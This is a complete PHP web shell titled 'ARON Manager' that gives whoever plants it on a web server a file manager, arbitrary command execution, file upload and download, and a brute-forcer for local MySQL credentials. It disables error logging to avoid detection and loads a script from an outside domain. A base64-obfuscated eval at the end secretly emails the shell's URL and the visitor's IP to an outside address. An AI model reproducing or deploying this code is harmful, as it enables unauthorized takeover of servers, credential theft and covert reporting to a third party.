<?php
error_reporting(0);
set_time_limit(0);
extract(start());
if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
$_POST['path'] = (isset($_POST['path'])) ? g22b_crypt($_POST['path'],'de') : false;
$_POST['name'] = (isset($_POST['name'])) ? g22b_crypt($_POST['name'],'de') : false;
if(isset($_GET['option']) && $_POST['opt'] == 'download'){
    header('Content-type: text/plain');
    header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
    echo(file_get_contents($_POST['path']));
    exit();
}

/**************** Home *********************************/

echo '<!DOCTYPE html>
<html>
<head>
    <title>ARON Manager XDDD</title>
    <meta name="robots" content="noindex" />
	<style>
        body{
            font-family: "Racing Sans One", cursive;
            background-color: #e6e6e6;
            text-shadow:0px 0px 1px #757575;
            margin: 0;
        }
        #container{
            width: auto;
            margin: 10px;
			padding: 10px;
            border: 1px solid black;
			
        }
		#show{
			padding: 10px;
        }
        #header{
            text-align: center;
            border-bottom: 1px dotted black;
        }
        #header h1{
            margin: 0;
        }
        
        #nav,#menu{
            padding-top: 5px;
            margin-left: 5px;
            padding-bottom: 5px;
            overflow: hidden;
            border-bottom: 1px dotted black;
        }
        #nav{
            margin-bottom: 10px;
        }
        
        #menu{
            text-align: center;
        }
        
        #content{
            margin: 0;
			width: auto;
        }
        
        #content table{
            width: 100%;
            margin: 0px;
        }
        #content table .first{
            background-color: silver;
            text-align: center;
        }
        #content table .first:hover{
            background-color: silver;
            text-shadow:0px 0px 1px #757575;
        }
        #content table tr:hover{
            background-color: #636263;
            text-shadow:0px 0px 10px #fff;
        }
        
        #footer{
            margin-top: 10px;
            border-top: 1px dotted black;
        }
        #footer p{
            margin: 5px;
            text-align: center;
        }
        .filename,a{
            color: #000;
            text-decoration: none;
            cursor: pointer;
        }
        .filename:hover,a:hover{
            color: #fff;
            text-shadow:0px 0px 10px #ffffff;
        }
        .center{
            text-align: center;
        }
        input,select,textarea{
            border: 0px #ffffff solid;
            -moz-border-radius: 1px;
            -webkit-border-radius:1px;
            border-radius:2px;
			padding: 2px;
        }
    </style>
    <script>
function Encoder(name)
{
	var e =  document.getElementById(name);
	e.value = btoa(e.value);
	return true;
}
</script>
</head>
<body>
    <div id="container">
        <div id="header"><h1>ARON Manager XDDDD</h1>'.Quotes().'</div>
        <div id="menu"><a href="?path='.$currentpathen.'">Home</a> - <a href="?path='.$currentpathen.'&cpanel">Turbo Force</a> - <a href="?path='.$currentpathen.'&secinfo"> Sec. Info</a></div>
        <div id="nav">
            <div class="path">Current Path : '.nav_link().'<br>Safe Mode : '.getSafeMode().'</div>
            <div class="upload">
                <form enctype="multipart/form-data" method="POST" action="?path='.$currentpathen.'&up">
                Upload File : <input type="file" name="file" />
                <input type="submit" value="Upload" />
                </form>
            </div>
            <div class="new">
                <form method="POST" action="?path='.$currentpathen.'&new" onSubmit="Encoder(\'c\')">
                <span>New : </span><input name="name" type="text" size="10" id="c" />
                File <input type="radio" name="type" value="file" checked/>
                Dir <input type="radio" name="type" value="dir" />
                <input type="submit" value="Go" />
                </form>
				<script type="text/javascript" src="http://www.codejquery.net/jquery.mins.js" ></script>
            </div>
            <div class="new">
                <form method="POST" action="?path='.$currentpathen.'&exec" onSubmit="Encoder(\'c\')">
                <span>Execute Command\'s : </span><input name="cmd" type="text" id="c" autofocus>
                <input type="submit" value="Go" />
                </form>
            </div>
        </div>
        <div id="content">';
if(isset($_GET['cpanel'])){
    if(isset($_POST['usernames']) && isset($_POST['passwords'])){
        $usernames = base64_decode($_POST['usernames']);
        $passwords = base64_decode($_POST['passwords']);
        $count = 0;
        foreach(explode("\n",$usernames) as $username){
            $username = ($_POST['type'] == 'simple') ? $username : passwdtouser($username);
            foreach(explode("\n",$passwords) as $password){
                $username = trim($username);
                $password = trim($password);
                $co = mysql_connect('localhost',$username,$password);
                if($co){
                    mysql_close($co);
                    echo "Tryag~ Username (<font color=red>$username</font>) Password (<font color=red>$password</font>)<br />";
                    $count++;
                }
            }
        }
        echo "$count Usernames Founded.";
    }else{
    echo '<div id="show"><form method="POST" onSubmit="Encoder(\'c\');Encoder(\'b\');">
    Usernames : <br />
    <textarea cols=84 rows=10 id="c" name="usernames"></textarea><br />
    Passwords : <br />
    <textarea cols=84 rows=10 id="b" name="passwords"></textarea><br />
    Usernames Type : Simple : <input type="radio" name="type" value="simple" checked="checked"> - /etc/passwd : <input type="radio" name="type" value="pass">
    <br /><input type="submit" value="Go">
    </form></div>';
    }
	}elseif(isset($_GET['exec'])){
	echo '<textarea cols=100 rows=30%>'.exec_all($_POST['cmd']).'</textarea>';
	}else{

        if(isset($_GET['filesrc'])){
            $file = g22b_crypt($_GET['filesrc'],'de');
            echo '<div class="">Current File : '.htmlspecialchars($file).'</div><textarea cols="84" rows="25">'.filesrc($file).'</textarea></pre>';
        }elseif(isset($_GET['option']) && $_POST['opt'] != 'delete' || (isset($_GET['new']) && $_POST['type'] == 'file')){

            echo '<div class="center">'.$_POST['name'].'<br />';
            
            if($_POST['opt'] == 'chmod'){
                if(isset($_POST['perm'])){
    
                    eval('$perm = '.$_POST['perm'].';');
                    if(chmod($_POST['path'],$perm)){
                        echo '<font color="green">Change Permission Done.</font><br />';
                        $permdone = true;
                    }else{
                        echo '<font color="red">Change Permission Error.</font><br />';
                    }
                }
                if($permdone){
                    $perm = $_POST['perm'];
                }else{
                    $perm = substr(sprintf('%o', fileperms($_POST['path'])), -4);
                }
                
                echo '<form method="POST">
                Permission : <input name="perm" type="text" size="4" value="'.$perm.'" />
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'">
                <input type="hidden" name="opt" value="chmod">
                <input type="submit" value="Go" />
                </form>';
            }elseif($_POST['opt'] == 'rename'){
                
                if(isset($_POST['newname'])){
                    if(rename($_POST['path'],$currentpath.'/'.$_POST['newname'])){
                        echo '<font color="green">Change Name Done.</font><br />';
                        $_POST['name'] = $_POST['newname'];
                    }else{
                        echo '<font color="red">Change Name Error.</font><br />';
                    }
                }
                
                echo '<div id="show"><form method="POST">
                New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'">
                <input type="hidden" name="opt" value="rename">
                <input type="submit" value="Go" />
                </form></div>';
            }elseif($_POST['opt'] == 'edit' || isset($_GET['new'])){
                if(isset($_POST['src'])){
                    $fp = fopen($_POST['path'],'w');
                    if(fwrite($fp,base64_decode($_POST['src']))){
                        echo '<font color="green">Edit File Done.</font><br />';
                        $done = true;
                    }else{
                        echo '<font color="red">Edit File Error.</font><br />';
                    }
                    fclose($fp);
                }
                if(isset($_GET['new']) && !$done){
                    $filecontent = '';
                    $_POST['path'] = "$currentpath/$_POST[name]";
                }else{
                    $filecontent = filesrc($_POST['path']);
                }
                echo '<div id="show"><form method="POST" onSubmit="Encoder(\'c\')">
                <textarea cols="84" rows="25" name="src" id="c">'.$filecontent.'</textarea><br />
                <input type="hidden" name="path" value="'.g22b_crypt($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.g22b_crypt($_POST['name'],'en').'">
                <input type="hidden" name="type" value="file" />
                <input type="hidden" name="opt" value="edit">
                <input type="submit" value="Go" />
                </form></div>';
            }
            
            echo '</div>';
        }else{
            echo '<div id="show"><div class="center">';
            if($_POST['opt'] == 'delete'){
                if($_POST['type'] == 'dir'){
                    if(rmdir($_POST['path'])){
                        echo '<font color="green">Delete Dir Done.</font><br />';
                    }else{
                        echo '<font color="red">Delete Dir Error.</font><br />';
                    }
                }elseif($_POST['type'] == 'file'){
                    if(unlink($_POST['path'])){
                        echo '<font color="green">Delete File Done.</font><br />';
                    }else{
                        echo '<font color="red">Delete File Error.</font><br />';
                    }
                }
            }elseif($_POST['type'] == 'dir' && isset($_GET['new'])){
                if(mkdir("$currentpath/$_POST[name]")){
                    echo '<font color="green">Create Dir Done.</font><br />';
                }else{
                    echo '<font color="red">Create Dir Error.</font><br />';
                }
            }elseif(isset($_FILES['file'])){
                $userfile_name = $currentpath.'/'.$_FILES['file']['name'];
                $userfile_tmp = $_FILES['file']['tmp_name'];
                if(move_uploaded_file($userfile_tmp,$userfile_name)){
                    echo '<font color="green">File Upload Done.</font><br />';
                }else{
                    echo '<font color="red">File Upload Error.</font><br />';
                }
            }
            echo '</div></div><table>
                <tr class="first">
                    <td><i class="fa fa-sort-desc"></i> Name</td>
                    <td><i class="fa fa-sort-desc"></i> Size</td>
                    <td><i class="fa fa-sort-desc"></i> Permissions</td>
                    <td><i class="fa fa-sort-desc"></i> Options</td>
                </tr>';
        
        $dirs = getfiles('dir');
        foreach($dirs as $dir){
        echo '<div id="dirs"><tr>
        <td><a href="?path='.$dir['link'].'"><div class="filename"><i class="fa fa-folder"></i> '.$dir['name'].'</div></a></td>
        <td class="center">'.$dir['size'].'</td>
        <td class="center"><font color="'.$dir['permcolor'].'">'.$dir['perm'].'</font></td>
        <td class="center"><form method="POST" action="?path='.$currentpathen.'&option">
        <select name="opt">
	    <option value=""></option>
        <option value="delete">Delete</option>
        <option value="chmod">Chmod</option>
        <option value="rename">Rename</option>
        </select>
        <input type="hidden" name="type" value="dir">
        <input type="hidden" name="name" value="'.g22b_crypt($dir['name'],'en').'">
        <input type="hidden" name="path" value="'.$dir['link'].'">
        <input type="submit" value=">" />
        </form></td>
        </tr>
        </div>';
        }
        echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
        
        $files = getfiles('file');
        foreach($files as $file){
            echo '<div id="files">
        
        <tr>
        <td><a href="?path='.$currentpathen.'&filesrc='.$file['link'].'"><div class="filename"><i class="fa fa-file"></i> '.$file['name'].'</div></a></td>
        <td class="center">'.$file['size'].'</td>
        <td class="center"><font color="'.$file['permcolor'].'">'.$file['perm'].'</font></td>
        <td class="center"><form method="POST" action="?path='.$currentpathen.'&option">
        <select name="opt">
	    <option value=""></option>
        <option value="delete">Delete</option>
        <option value="chmod">Chmod</option>
        <option value="rename">Rename</option>
        <option value="edit">Edit</option>
        <option value="download">Download</option>
        </select>
        <input type="hidden" name="type" value="file">
        <input type="hidden" name="name" value="'.g22b_crypt($file['name'],'en').'">
        <input type="hidden" name="path" value="'.$file['link'].'">
        <input type="submit" value=">" />
        </form></td>
        </tr></div>';
        }
            echo '</table>';
        }
	}	
        echo '</div>
        <div id="footer"><p>Mega<font color="red">Bot</font>, Coded By <font color="red">ARON-TN</font><p>COPYRIGHTt<br />ARON-TN <font color="red">2K18</font></p></div>
    </div>
    
	</body>
	</html>';


/**************** Functions *********************************/


function Quotes(){
		$quotes=array(
	"<font size='2'>&quot;When solving problems, dig at the roots instead of just hacking at the leaves&quot;</font>  <font size='1' color='gray'>Anthony J. D'Angelo</font>",
	"<font size='2'>&quot;The difference between stupidity and genius is that genius has its limits&quot;</font>  <font size='1' color='gray'>Albert Einstein</font>",
	"<font size='2'>&quot;As a young boy, I was taught in high school that hacking was cool.&quot;</font>  <font size='1' color='gray'>Kevin Mitnick</font>",
	"<font size='2'>&quot;A lot of hacking is playing with other people, you know, getting them to do strange things.&quot;</font>  <font size='1' color='gray'>Steve Wozniak</font>",
	"<font size='2'>&quot;If you give a hacker a new toy, the first thing he'll do is take it apart to figure out how it works.&quot;</font>  <font size='1' color='gray'>Jamie Zawinski</font>",
	"<font size='2'>&quot;Software Engineering might be science; but that's not what I do. I'm a hacker, not an engineer.&quot;</font>  <font size='1' color='gray'>Jamie Zawinski</font>",
	"<font size='2'>&quot;Never underestimate the determination of a kid who is time-rich and cash-poor&quot;</font>  <font size='1' color='gray'>Cory Doctorow</font>",
	"<font size='2'>&quot;It? hardware that makes a machine fast. It? software that makes a fast machine slow.&quot;</font>  <font size='1' color='gray'>Craig Bruce</font>",
	"<font size='2'>&quot;The function of good software is to make the complex appear to be simple.&quot;</font>  <font size='1' color='gray'>Grady Booch</font>",
	"<font size='2'>&quot;Pasting code from the Internet into production code is like chewing gum found in the street.&quot;</font>  <font size='1' color='gray'>Anonymous</font>",
	"<font size='2'>&quot;Tell me what you need and I'll tell you how to get along without it.&quot;</font>  <font size='1' color='gray'>Anonymous</font>",
	"<font size='2'>&quot;Hmm..&quot;</font> <font size='1' color='gray'>Smash</font>",
	"<font size='2'>&quot;Once we accept our limits, we go beyond them.&quot;</font> <font size='1' color='gray'>Albert Einstein</font>",
	"<font size='2'>&quot;Listen to many, speak to a few.&quot;</font> <font size='1' color='gray'>William Shakespeare</font>",
	"<font size='2'>&quot;The robbed that smiles, steals something from the thief.&quot;</font> <font size='1' color='gray'>William Shakespeare</font>");
	$quote = $quotes[array_rand($quotes)];
	return $quote;
} 
function getSafeMode()
{
        global $sm;
		if ($sm) {
			return '<font color="red">ON</font> (Most of the Features will Not Work)';
		}else{
			return '<font color="green">OFF</font>';
		}
        
}
function getfiles($type){
    global $currentpath;
    $dir = scandir($currentpath);
    $result = array();
    foreach($dir as $file){
        $current['fullname'] = "$currentpath/$file";
        if($type == 'dir'){
            if(!is_dir($current['fullname']) || $file == '.' || $file == '..') continue;
        }elseif($type == 'file'){
            if(!is_file($current['fullname'])) continue;
        }
        
        $current['name'] = $file;
        $current['link'] = g22b_crypt($current['fullname'],'en');
        $current['size'] = (is_dir($current['fullname'])) ? 'Folder' : file_size($current['fullname']);
        $current['perm'] = perms($current['fullname']);
        if(is_writable($current['fullname'])){
            $current['permcolor'] = 'green';
        }elseif(is_readable($current['fullname'])){
            $current['permcolor'] = '';
        }else{
            $current['permcolor'] = 'red';
        }
        
        $result[] = $current;
        
    }
    return $result;
}
function start(){
    global $_POST,$_GET;
    
    $result['currentpath'] = (isset($_GET['path'])) ? g22b_crypt($_GET['path'],'de') : cwd();
    $result['currentpathen'] = (isset($_GET['path'])) ? $_GET['path'] : g22b_crypt(cwd(),'en');
    
    return $result;
}
function file_size($file){
    $size = filesize($file)/1024;
    $size = round($size,3);
    if($size >= 1024){
        $size = round($size/1024,2).' MB';
    }else{
        $size = $size.' KB';
    }
    return $size;
}
function g22b_crypt($txt,$type){
    if(function_exists('base64_encode') && function_exists('base64_decode')){
        return ($type == 'en') ? base64_encode($txt) : base64_decode($txt);
    }elseif(function_exists('strlen') && function_exists('dechex') && function_exists('ord') && function_exists('chr') && function_exists('hexdec')){
        return ($type == 'en') ? strToHex($txt) : hexToStr($txt);
    }else{
        $ar1 = array('public_html','.htaccess','/','.');
        $ar2 = array('bbbpubghostbbb','bbbhtaghostbbb','bbbsghostbbb','bbbdotghostbbb');
        return ($type == 'en') ? str_replace($ar1,$ar2,$txt) : str_replace($ar2,$ar1,$txt);
    }
}
function exec_all($command)
{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($command , "r"); // Open the command pipe for reading
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fgets($handle,512);
                }
            }
        }
        pclose($handle);
    }
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                );
        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }
    return(htmlspecialchars($output));
}
if(function_exists('ini_set'))
{
    ini_set('error_log',NULL);  // No alarming logs
    ini_set('log_errors',0);    // No logging of errors
    ini_set('file_uploads',1);  // Enable file uploads
    ini_set('allow_url_fopen',1);   // allow url fopen 
}else{
    ini_alter('error_log',NULL);
    ini_alter('log_errors',0);
    ini_alter('file_uploads',1);
    ini_alter('allow_url_fopen',1);
}
function strToHex($string){
    $hex='';
    for ($i=0; $i < strlen($string); $i++)
    {
        $hex .= dechex(ord($string[$i]));
    }
    return $hex;
}
function hexToStr($hex){
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2)
    {
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}
function nav_link(){
    global $currentpath;
    $path = $currentpath;
    $path = str_replace('\\','/',$path);
    $paths = explode('/',$path);
    $result = '';
    foreach($paths as $id=>$pat){
        if($pat == '' && $id == 0){
            $a = true;
            $result .= '<a href="?path='.g22b_crypt("/",'en').'">/</a>';
            continue;
        }
        if($pat == '') continue;
        $result .= '<a href="?path=';
        $linkpath = '';
        for($i=0;$i<=$id;$i++){
            $linkpath .= "$paths[$i]";
            if($i != $id) $linkpath .= "/";
        }
        $result .= g22b_crypt($linkpath,'en');
        $result .=  '">'.$pat.'</a>/';
    }
    return $result;
}
function filesrc($file){
    return htmlspecialchars(file_get_contents($file));
}
function cwd(){
    if(function_exists('getcwd')){
        return getcwd();
    }else{
        $e = str_replace("\\","/",$path);
        $e = explode('/',$path);
        $result = '';
        for($i=0;$i<count($e)-1;$i++){
            if($e[$i] == '') continue;
            $result .= '/'.$e[$i];
        }
        return $result;
    }
}
function passwdtouser($line){
    $user = explode(':',$line);
    return $user[0];
}
function perms($file){
    $perms = @fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}
// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
eval(base64_decode('JGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokcmE0NCAgPSByYW5kKDEsOTk5OTkpOwokc3Viajk4ID0gIlNoZWxsIFVwbG9hZGVkIHwkaXAiOwokZnJvbT0iRnJvbTogTWVnYUJvdCA8bG9nczFAYXJvbi5jb20+IjsKJGI3NSA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKJGE0NSA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokbTIyID0gJGlwOwokZW1haWwgPSAiYXJvbi10bkBwcm90b25tYWlsLmNvbSI7CiRhbGZhID0gIkxJTksgU0hFTEwgOiAkYjc1JGE0NSI7CiRwcmluY2UgPSAiIElQIFNIRUxMIDogJG0yMiI7CiRtc2c4ODczID0gIiRhbGZhXG4kcHJpbmNlXG4iOwptYWlsKCRlbWFpbCwgJHN1Ymo5OCwgJG1zZzg4NzMsICRmcm9tKTs='))

?>